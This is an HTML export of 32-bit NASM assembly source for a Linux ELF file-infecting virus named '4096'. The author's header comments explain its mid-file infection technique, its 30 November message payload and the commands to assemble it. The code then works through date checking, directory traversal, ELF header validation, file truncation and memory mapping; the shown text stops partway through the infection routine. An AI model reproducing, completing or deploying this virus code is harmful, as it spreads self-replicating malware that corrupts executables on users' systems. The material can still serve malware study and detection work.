<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Virus name.....................4096</span><span class="sc0">
</span><span class="sc1">;   Author.........................badCRC</span><span class="sc0">
</span><span class="sc1">;   E-mail.........................thejesterdance@hotmail.com</span><span class="sc0">
</span><span class="sc1">;   Length.........................556 bytes</span><span class="sc0">
</span><span class="sc1">;   OS.............................Linux</span><span class="sc0">
</span><span class="sc1">;   Origin.........................Spain</span><span class="sc0">
</span><span class="sc1">;   Finished.......................August 2003</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   -----------</span><span class="sc0">
</span><span class="sc1">;   | INTRODUCTION |</span><span class="sc0">
</span><span class="sc1">;   -----------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     First of all, I have to say my english is not very  good,  so</span><span class="sc0">
</span><span class="sc1">;   I'm sorry if you don't understand all  I  write.  I'll  try  to</span><span class="sc0">
</span><span class="sc1">;   explain me in the best way I can ;)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     This is my first released virus and I want to dedicate it  to</span><span class="sc0">
</span><span class="sc1">;   a girl who is very special for me (she knows who she is  :)  On</span><span class="sc0">
</span><span class="sc1">;   the other hand, I also want to thank Wintermute for  his  virus</span><span class="sc0">
</span><span class="sc1">;   course and all the people in  the  scene  who  write  or  wrote</span><span class="sc0">
</span><span class="sc1">;   interesting things.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   ----------</span><span class="sc0">
</span><span class="sc1">;   | DISCLAIMER |</span><span class="sc0">
</span><span class="sc1">;   ----------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     I'm not responsible for what you do with this  virus  and  if</span><span class="sc0">
</span><span class="sc1">;   you spread it, it will be your  fault  and  not  mine.  So,  be</span><span class="sc0">
</span><span class="sc1">;   careful. In any case, this virus is  less  dangerous  than  the</span><span class="sc0">
</span><span class="sc1">;   Windows OS as you'll see xD</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   --------</span><span class="sc0">
</span><span class="sc1">;   | FEATURES |</span><span class="sc0">
</span><span class="sc1">;   --------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     It's about a runtime mid-file virus that  infects  executable</span><span class="sc0">
</span><span class="sc1">;   ELF files. Every time it is executed, it will try to  infect  3</span><span class="sc0">
</span><span class="sc1">;   files and then, it will return control to host. These files can</span><span class="sc0">
</span><span class="sc1">;   be in any directory that belong to the virus path. For example,</span><span class="sc0">
</span><span class="sc1">;   if the the virus resides  in  /tools/bin/,  it  will  look  for</span><span class="sc0">
</span><span class="sc1">;   files in bin, tools and /, that is, the root dir.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     I think the most interesting  thing  in  this  virus  is  the</span><span class="sc0">
</span><span class="sc1">;   infection method, so I'm going to explain it a little :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     When the virus finds a file suitable for infection,  it  will</span><span class="sc0">
</span><span class="sc1">;   search in the PHT for the first loadable segment,  usually  the</span><span class="sc0">
</span><span class="sc1">;   text segment. Now, we have to check for free space in the  last</span><span class="sc0">
</span><span class="sc1">;   memory page that this segment occupies because we want to  copy</span><span class="sc0">
</span><span class="sc1">;   us there. How? It's easy: subtract from 1000h the  last  3  hex</span><span class="sc0">
</span><span class="sc1">;   digits in p_memsz (I assume 4 KB pages). Let's see an  example.</span><span class="sc0">
</span><span class="sc1">;   Suppose p_memsz = 12AF9h. So, how much space  is  free  in  the</span><span class="sc0">
</span><span class="sc1">;   last page? 1000h - AF9h = 507h = 1287 bytes. Why are we limited</span><span class="sc0">
</span><span class="sc1">;   in this way? Because we copy us in the first loadable  segment,</span><span class="sc0">
</span><span class="sc1">;   and if there is another one, its first page will be  next  ours</span><span class="sc0">
</span><span class="sc1">;   and we don't want to be overwritten when the program is  loaded</span><span class="sc0">
</span><span class="sc1">;   into memory.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     Next step is increase file size and copy the virus  into  the</span><span class="sc0">
</span><span class="sc1">;   file. We'll have to fix the offsets of some entries in the  PHT</span><span class="sc0">
</span><span class="sc1">;   because of we are going to copy us  where  the  first  loadable</span><span class="sc0">
</span><span class="sc1">;   segment ends, that is, p_offset + p_filesz. The file size  will</span><span class="sc0">
</span><span class="sc1">;   be increased in 1000h bytes because file offsets (p_offset) and</span><span class="sc0">
</span><span class="sc1">;   virtual addresses (p_vaddr) must be congruent modulo  the  page</span><span class="sc0">
</span><span class="sc1">;   size (1000h), that is, if you divide  p_offset  or  p_vaddr  by</span><span class="sc0">
</span><span class="sc1">;   1000h,  the  remainder   will   be   the   same.   For   better</span><span class="sc0">
</span><span class="sc1">;   understanding, imagine there is another loadable  segment  next</span><span class="sc0">
</span><span class="sc1">;   ours and we have to fix its offset. Suppose  p_offset = 2BF00h,</span><span class="sc0">
</span><span class="sc1">;   p_vaddr = 8074F00h and virus length = 100h. If we increase file</span><span class="sc0">
</span><span class="sc1">;   size in 100h bytes, we'll have to add 100h to p_offset (2C000h)</span><span class="sc0">
</span><span class="sc1">;   and then, p_offset and p_vaddr won't be congruent modulo 1000h.</span><span class="sc0">
</span><span class="sc1">;   So, the minimum value in order they  continue  being  congruent</span><span class="sc0">
</span><span class="sc1">;   is 1000h.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     I hope you have understood it. If not, take  a  look  at  the</span><span class="sc0">
</span><span class="sc1">;   code, ok? Good luck!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   --------</span><span class="sc0">
</span><span class="sc1">;   | PAYLOAD |</span><span class="sc0">
</span><span class="sc1">;   --------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     Every 30 November the virus  will  print  a  message  on  the</span><span class="sc0">
</span><span class="sc1">;   screen. The way I use to compute the date is  not  precise,  so</span><span class="sc0">
</span><span class="sc1">;   the virus will activate a day before or after sometimes.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   ----------</span><span class="sc0">
</span><span class="sc1">;   | TO ASSEMBLE |</span><span class="sc0">
</span><span class="sc1">;   ----------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   nasm 4096.asm -o 4096.tmp -f elf</span><span class="sc0">
</span><span class="sc1">;   ld 4096.tmp -o 4096 -s</span><span class="sc0">
</span><span class="sc1">;   dwarf.exec 4096</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc9">BITS</span><span class="sc0">       </span><span class="sc2">32</span><span class="sc0">
</span><span class="sc9">SECTION</span><span class="sc0">   </span><span class="sc10">.text</span><span class="sc0">
</span><span class="sc9">GLOBAL</span><span class="sc0">    </span><span class="sc5">_start</span><span class="sc0">

</span><span class="sc5">_start</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">pushfd</span><span class="sc0">
      </span><span class="sc6">pushfd</span><span class="sc0">
      </span><span class="sc6">pushad</span><span class="sc0">

      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta</span><span class="sc0">

</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
      </span><span class="sc6">lodsd</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">delta</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                       </span><span class="sc1">; EBP = delta offset</span><span class="sc0">

      </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">730h</span><span class="sc0">


</span><span class="sc1">; time returns the seconds since January 1, 1970. Starting from this value,</span><span class="sc0">
</span><span class="sc1">;we have to compute the actual date</span><span class="sc0">

      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">                        </span><span class="sc1">; sys_time</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">cdq</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">151bbh</span><span class="sc0">                    </span><span class="sc1">; 86459 seconds</span><span class="sc0">
      </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">cdq</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16dh</span><span class="sc0">                      </span><span class="sc1">; 365 days</span><span class="sc0">
      </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">14dh</span><span class="sc0">                       </span><span class="sc1">; 30 Nov?</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_activarse</span><span class="sc0">


</span><span class="sc1">; PAYLOAD</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                        </span><span class="sc1">; sys_write</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">mensaje</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">len</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">


</span><span class="sc5">no_activarse</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">numinfect</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; set number of infections to 0</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">old_entry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b7h</span><span class="sc0">                       </span><span class="sc1">; sys_getcwd</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">334h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

</span><span class="sc5">abrir_dir</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">dot</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                        </span><span class="sc1">; sys_open</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                       </span><span class="sc1">; EBX = fd</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">22ah</span><span class="sc0">

</span><span class="sc5">leer_entrada</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc0">                        </span><span class="sc1">; old_readdir</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infect</span><span class="sc0">

      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                        </span><span class="sc1">; sys_close</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b7h</span><span class="sc0">                       </span><span class="sc1">; sys_getcwd</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">22h</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">salir</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">                        </span><span class="sc1">; sys_chdir</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">abrir_dir</span><span class="sc0">

</span><span class="sc5">salir</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">                        </span><span class="sc1">; sys_chdir</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">popad</span><span class="sc0">
      </span><span class="sc6">popfd</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">                                   </span><span class="sc1">; return control to host</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">pushad</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                        </span><span class="sc1">; sys_open</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                        </span><span class="sc1">; O_RDWR</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">; error?</span><span class="sc0">
      </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">seguimos</span><span class="sc0">

      </span><span class="sc6">popad</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">leer_entrada</span><span class="sc0">

</span><span class="sc5">seguimos</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                       </span><span class="sc1">; EBX = fd</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; EAX = 3 (sys_read)</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">234h</span><span class="sc0">                      </span><span class="sc1">; amount of bytes we want to</span><span class="sc0">
                                            </span><span class="sc1">;read from the file (52 + 512)</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc2">464c457fh</span><span class="sc0">         </span><span class="sc1">; ELF?</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@close_file</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">            </span><span class="sc1">; executable?</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@close_file</span><span class="sc0">

</span><span class="sc5">busca_loadable</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                       </span><span class="sc1">; next entry in the PHT</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; loadable?</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">busca_loadable</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; EAX = p_memsz</span><span class="sc0">
      </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">virus_len</span><span class="sc0">
      </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@close_file</span><span class="sc0">

      </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

      </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc0">                        </span><span class="sc1">; sys_newfstat</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; EDI = original file size</span><span class="sc0">

      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                       </span><span class="sc1">; ECX = new file size</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5dh</span><span class="sc0">                        </span><span class="sc1">; sys_ftruncate</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; beginning of the file (0)</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                           </span><span class="sc1">; fd</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; MAP_SHARED (1)</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; PROT_READ + PROT_WRITE (3)</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                           </span><span class="sc1">; map the whole file</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                           </span><span class="sc1">; 0</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc0">                        </span><span class="sc1">; old_mmap</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                       </span><span class="sc1">; restore stack</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fffff000h</span><span class="sc0">                </span><span class="sc1">; error?</span><span class="sc0">
      </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">map_ok</span><span class="sc0">

      </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                       </span><span class="sc1">; ECX = original file size</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5dh</span><span class="sc0">                        </span><span class="sc1">; sys_ftruncate</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">

      </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restore_date</span><span class="sc0">

</span><span class="sc5">@close_file</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">map_ok</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                       </span><span class="sc1">; EBX = map address</span><span class="sc0">
